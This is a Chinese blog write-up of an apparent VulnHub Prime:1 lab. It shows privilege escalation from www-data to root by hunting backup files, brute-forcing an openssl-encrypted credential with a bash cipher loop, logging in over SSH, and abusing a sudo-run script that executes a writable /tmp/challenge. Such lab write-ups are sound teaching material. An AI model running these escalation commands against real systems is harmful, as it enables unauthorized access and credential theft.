


---




---


# Prime2\_解法二：openssl解密凭据




---




---


本博客提供的所有信息仅供学习和研究目的，旨在提高读者的网络安全意识和技术能力。请在合法合规的前提下使用本文中提供的任何技术、方法或工具。如果您选择使用本博客中的任何信息进行非法活动，您将独自承担全部法律责任。本博客明确表示不支持、不鼓励也不参与任何形式的非法活动。


如有侵权请联系我第一时间删除


靶机下载地址


[Prime: 1 \~ VulnHub](https://github.com)


## find查找备份文件得到key of enc


在第一种解法得到系统立足点后，第一种解法使用linux内核漏洞提权，但内核漏洞提权在实战渗透中太过于暴力，很可能会造成系统服务的重启或中断，导致得到的shell丢失，服务器管理员修复漏洞等不利于渗透的情况。所以这里带来第二种解法：openssl解密凭据


find指令查找带有\*back\*的文件 并把报错结果丢弃（权限不够）



```
find / -name "*backup*" 2>/dev/null

```

![](https://img2024.cnblogs.com/blog/3409507/202412/3409507-20241209174305321-590733012.png)


查看backup\_pass



```
www-data@ubuntu:/opt/backup/server_database$ cat backup_pass
cat backup_pass
your password for backup_database file enc is 

"backup_password"


Enjoy!


```

## 运行enc得到密文enc.txt \& 密钥key.txt


提示我们enc的密码是backupa\_password enc是我们sudo \-l查看www\-data用户权限时看到的一个文件



```
www-data@ubuntu:/opt/backup/server_database$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (root) NOPASSWD: /home/saket/enc

```

cd到/home/saket目录，再执行enc（直接执行绝对路径会报错）



```
www-data@ubuntu:/home/saket$ ./enc  
./enc
enter password: backup_password
good
/bin/cp: cannot stat '/root/enc.txt': Permission denied
/bin/cp: cannot stat '/root/key.txt': Permission denied

```

没什么反应，看到有个报错权限不够，加个sudo试试



```
www-data@ubuntu:/home/saket$ sudo ./enc
sudo ./enc
enter password: backup_password
good


```

还是没反应，重新ls发现多出来enc.txt 和 key.txt原来是运行enc后，帮我们从/root下拿出来了这两个txt文件



```
www-data@ubuntu:/home/saket$ ls -lah
ls -lah
total 44K
drwxr-xr-x 2 root root 4.0K Dec  6 23:23 .
drwxr-xr-x 4 root root 4.0K Aug 29  2019 ..
-rw------- 1 root root   20 Aug 31  2019 .bash_history
-rwxr-x--x 1 root root  14K Aug 30  2019 enc
-rw-r--r-- 1 root root  237 Dec  6 23:23 enc.txt
-rw-r--r-- 1 root root  123 Dec  6 23:23 key.txt
-rw-r--r-- 1 root root   18 Aug 29  2019 password.txt
-rw-r--r-- 1 root root   33 Aug 31  2019 user.txt


```

看一下这两个txt



```
www-data@ubuntu:/home/saket$ cat enc.txt
cat enc.txt



www-data@ubuntu:/home/saket$ cat key.txt
cat key.txt
I know you are the fan of ippsec.

So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.

```

第一个是一个加密过的密文，key的大意为 我知道你是ippsec的粉丝，所以将ippsec这个字符串转换为md5hash，用它获得你的real form吧


那就先来md5一下ippsec，红笔大佬用kali去进行的，我就直接用赛博大厨了



```
366a74cb3c959de17d61db30591c39d1

```

用命令行的方法放在下面


`-n`用于去掉字符串后的换行符



```
echo –n 'ippsec' | md5sum

```

awk用于处理字符串，`awk -F ' ' '{print $1;}'`意思是以空格为分割，打印其中第一个部分`$1`，这样就会只输出`366a74cb3c959de17d61db30591c39d1` 后面的 `-` 不会输出。



```
echo -n 'ippsec' | md5sum | awk -F ' ' '{print $1;}'

```

## Openssl解密


简单查看帮助，发现有这么多加密方式，应该使用什么方式去解密呢，我们要知道加密基本分为对称加密和非堆成加密


对称加密使用相同的密钥对密文进行加密和解密，常见的加密方式有AES，DES， 3DES，RC4，5，6等


非对称加密使用一对密钥（公钥和私钥）



```
┌──(observer㉿kali)-[~]
└─$ openssl                                
help:

Standard commands
asn1parse         ca                ciphers           cmp               
cms               crl               crl2pkcs7         dgst              
dhparam           dsa               dsaparam          ec                
ecparam           enc               engine            errstr            
fipsinstall       gendsa            genpkey           genrsa            
help              info              kdf               list              
mac               nseq              ocsp              passwd            
pkcs12            pkcs7             pkcs8             pkey              
pkeyparam         pkeyutl           prime             rand              
rehash            req               rsa               rsautl            
s_client          s_server          s_time            sess_id           
smime             speed             spkac             srp               
storeutl          ts                verify            version           
x509              

Message Digest commands (see the `dgst' command for more details)
blake2b512        blake2s256        md4               md5               
rmd160            sha1              sha224            sha256            
sha3-224          sha3-256          sha3-384          sha3-512          
sha384            sha512            sha512-224        sha512-256        
shake128          shake256          sm3               

Cipher commands (see the `enc' command for more details)
aes-128-cbc       aes-128-ecb       aes-192-cbc       aes-192-ecb       
aes-256-cbc       aes-256-ecb       aria-128-cbc      aria-128-cfb      
aria-128-cfb1     aria-128-cfb8     aria-128-ctr      aria-128-ecb      
aria-128-ofb      aria-192-cbc      aria-192-cfb      aria-192-cfb1     
aria-192-cfb8     aria-192-ctr      aria-192-ecb      aria-192-ofb      
aria-256-cbc      aria-256-cfb      aria-256-cfb1     aria-256-cfb8     
aria-256-ctr      aria-256-ecb      aria-256-ofb      base64            
bf                bf-cbc            bf-cfb            bf-ecb            
bf-ofb            camellia-128-cbc  camellia-128-ecb  camellia-192-cbc  
camellia-192-ecb  camellia-256-cbc  camellia-256-ecb  cast              
cast-cbc          cast5-cbc         cast5-cfb         cast5-ecb         
cast5-ofb         des               des-cbc           des-cfb           
des-ecb           des-ede           des-ede-cbc       des-ede-cfb       
des-ede-ofb       des-ede3          des-ede3-cbc      des-ede3-cfb      
des-ede3-ofb      des-ofb           des3              desx              
rc2               rc2-40-cbc        rc2-64-cbc        rc2-cbc           
rc2-cfb           rc2-ecb           rc2-ofb           rc4               
rc4-40            seed              seed-cbc          seed-cfb          
seed-ecb          seed-ofb          sm4-cbc           sm4-cfb           
sm4-ctr           sm4-ecb           sm4-ofb           zlib              
zstd         

```

虽然知道加密方式为对称加密，但我们还是很难确定具体的加密方式，到底是AES，DES， 3DES，RC4，5，6之中的一种的那种模式，还是是其他的对称加密，所以直接暴力破解吧


用enc模块去解密


![](https://img2024.cnblogs.com/blog/3409507/202412/3409507-20241209174336073-312377020.png)


需要将key转换成16进制


直接在此前的基础上用od转换成16进制，并用tr进行一些数据上的处理



```
echo -n 'ippsec' | md5sum | awk -F ' ' '{print $1;}' | tr -d '\n' | od -A n -t x1| tr -d '\n' | tr -d ' '

```

参数说明


`od -A n -t x1` `-A n` 指定偏移量为null `-t x1`  指定输出类型为单字节的十六进制值 `x` 表示十六进制，`1` 表示每个输出项是一个字节。


`tr -d '\n'`  `tr -d ' '` \-d, 删除 ARRAY1 中的字符


得到hex后的密钥`3336366137346362336339353964653137643631646233303539316333396431`


以下引用自：[Vulnhub靶机实操笔记\-Prime1\-解法二 \- FreeBuf网络安全行业门户](https://github.com):[FlowerCloud机场](https://yunbeijia.com)



> 单字节转16进制：使用ASCII码表将每个字符转换为对应的16进制值。例如，字符串 "A" 的16进制表示为 "41"，其中 "41" 是字符 "A" 在ASCII码表中的十六进制表示。
> 
> 
> 双字节转16进制：使用Unicode字符编码标准将每个字符转换为对应的16进制值。例如，字符串 "中" 的16进制表示为 "4E2D"，其中 "4E2D" 是字符 "中" 在Unicode编码表中的十六进制表示。
> 
> 
> 对于判断是使用双字节还是单字节转16进制，您需要查看当前编码方式，主要有以下三种：
> 
> 
> ASCII编码：该编码方式只支持单字节字符，因此在此编码方式下，将字符串转换为16进制时只需要使用单字节转换方式即可。例如 "ippsec" 就是单字节。
> UTF\-8编码：UTF\-8编码是一种可变长度字符编码方式，支持单字节和双字节字符。在此编码方式下，单字节字符采用单字节转换方式，而双字节字符采用双字节转换方式。例如 "中文" 就是双字节字符。
> UTF\-16编码：UTF\-16编码是一种双字节编码方式，因此在此编码方式下，所有字符都是双字节字符，需要使用双字节转换方式。例如 "英文" 在UTF\-16编码方式下也是双字节字符。
> 
> 
> 根据上述规则，如果字符串 "ippsec" 是使用ASCII编码的，则将其转换为16进制时只需要使用单字节转换方式；如果是使用UTF\-8编码，那么需要对其中的双字节字符使用双字节转换方式。



```
echo "nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=" | openssl enc -d -a -cipherType -K 3336366137346362336339353964653137643631646233303539316333396431

```

参数说明


`-d` 解密模式


`-a`  base64解密 密文一眼顶真为base64加密过的


`-cipherType` 这里指定加密方式，这里不知道先用这个代替


`-K` 指定密钥，需要用16进制


## 加密方式的爆破文件


touch新建一个文件ciphertype.txt vim一下，把加密方式放进去


用awk处理一下，gsub()函数将空格替换成换行符



```
awk '{gsub(" ","\n");print}' ciphertype.txt

```

处理之后变成这样了（一小部分），那就把换行符都删掉



```
sm4-ecb










sm4-ofb











```

将awk输出的结果处理一下： sort让非空行聚集在一起，然后uniq将每一项字符串但独占一行



```
awk '{gsub(" ","\n");print}' ciphertype.txt | sort | uniq

```

![](https://img2024.cnblogs.com/blog/3409507/202412/3409507-20241209174349678-1558785541.png)


然后将结果放进一个指定文件，这样爆破要用到的文件就做好了



```
awk '{gsub(" ","\n");print}' ciphertype.txt | sort | uniq > ciphertypeforce

```

## openssl\+bash脚本暴力破解


写个bash脚本，用for循环暴力破解一下



```
for cipher in $(cat ciphertypeforce); do echo "nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=" | openssl enc -d -a -$cipher -K 3336366137346362336339353964653137643631646233303539316333396431 2>/dev/null;echo $cipher;done

```

![](https://img2024.cnblogs.com/blog/3409507/202412/3409507-20241209174357806-949327059.png)


拿到了加密方式和明文



```
Dont worry saket one day we will reach to
our destination very soon. And if you forget 
your username then use your old password
==> "tribute_to_ippsec"

Victor,aes-256-ecb

```

所以现在用这个也可以了，\-aes\-256\-ecb加密方式是不需要指定iv的（偏移量）



```
echo "nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=" | openssl enc -d -a -aes-256-ecb -K 3336366137346362336339353964653137643631646233303539316333396431

```

可能看到这已经忘记之前etc/passwd里有一个1001用户saket，我们拿到了他的凭据，用它去ssh登陆吧


![](https://img2024.cnblogs.com/blog/3409507/202412/3409507-20241209174406311-1716571134.png)


## ssh连接saket用户



```
sudo ssh saket@靶机ip

```

输入yes，输入密码tribute\_to\_ippsec


成功拿到saket用户的权限，用python提升一下shell交互性，这里前面打sickos解法二时介绍过，不再赘述



```
python -c 'import pty;pty.spawn("/bin/bash")'

```

sudo \-l看一下权限，权限还是不高，但是有新的发现，可以root权限执行/home/victor/undefeated\_victor



```
saket@ubuntu:~$ sudo -l
Matching Defaults entries for saket on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saket may run the following commands on ubuntu:
    (root) NOPASSWD: /home/victor/undefeated_victor

```

没有权限查看，应该是只有运行权限



```
saket@ubuntu:~$ cd /home/victor
saket@ubuntu:/home/victor$ ls -liah
ls: cannot open directory '.': Permission denied

```

给了一段文字 如果你可以打败我那就在你面前挑战我 然后报错提示/tmp/challenge: not found



```
saket@ubuntu:/home/victor$ sudo ./undefeated_victor
if you can defeat me then challenge me in front of you
/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found

```

执行这个undefeated\_victor，就会牵扯到/tmp/challenge，如果undefeated\_victor的操作是执行challenge，那就可以在里面写入提权的命令来成功提权（因为root权限执行undefeated\_victor）


cd到tmp发现确实是没有challenge，那就直接写一个，刚好tmp目录的权限够用



```
saket@ubuntu:/tmp$ ls -liah
total 52K
786435 drwxrwxrwt 12 root root 4.0K Dec  7 08:26 .
     2 drwxr-xr-x 24 root root 4.0K Aug 29  2019 ..
789602 drwxrwxrwt  2 root root 4.0K Dec  6 22:37 .font-unix
788411 drwxrwxrwt  2 root root 4.0K Dec  6 22:37 .ICE-unix
790238 drwx------  3 root root 4.0K Dec  6 22:37 systemd-private-009a695cfec04602873ff4d0d451c890-colord.service-VimvwZ
790192 drwx------  3 root root 4.0K Dec  6 22:37 systemd-private-009a695cfec04602873ff4d0d451c890-rtkit-daemon.service-7QYuF5
789604 drwx------  3 root root 4.0K Dec  6 22:37 systemd-private-009a695cfec04602873ff4d0d451c890-systemd-timesyncd.service-3nNCGI
789603 drwxrwxrwt  2 root root 4.0K Dec  6 22:37 .Test-unix
788409 drwxrwxrwt  2 root root 4.0K Dec  6 22:37 VMwareDnD
789606 drwx------  2 root root 4.0K Dec  6 22:37 vmware-root
789614 -r--r--r--  1 root root   11 Dec  6 22:37 .X0-lock
788410 drwxrwxrwt  2 root root 4.0K Dec  6 22:37 .X11-unix
788412 drwxrwxrwt  2 root root 4.0K Dec  6 22:37 .XIM-unix

```

成功将challenge写为用于提权的bash脚本文件



```
saket@ubuntu:/tmp$ echo '#!/bin/bash' > challenge
saket@ubuntu:/tmp$ cat challenge
#!/bin/bash
saket@ubuntu:/tmp$ echo '/bin/bash' >> challenge
saket@ubuntu:/tmp$ cat challenge
#!/bin/bash
/bin/bash

```

再次执行undefeated\_victor 应该就能直接提权了（要回到/home/victor这个目录下）



```
saket@ubuntu:/home/victor$ sudo undefeated_victor
[sudo] password for saket: 
sudo: undefeated_victor: command not found
saket@ubuntu:/home/victor$ sudo /home/victor/undefeated_victor
if you can defeat me then challenge me in front of you
/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: Permission denied

```

提示没有权限执行，原因是我没有给challenge执行权限



```
chmod +x /tmp/challenge

```

成功拿下（附定妆照一张）


![](https://img2024.cnblogs.com/blog/3409507/202412/3409507-20241209174415667-685894801.png)


其实undefeated\_victor 就很简单，输入这一句话，然后执行challenge



```
root@ubuntu:/home/victor# cat undefeated_victor                                     
echo  "if you can defeat me then challenge me in front of you";                     
/tmp/challenge 

```

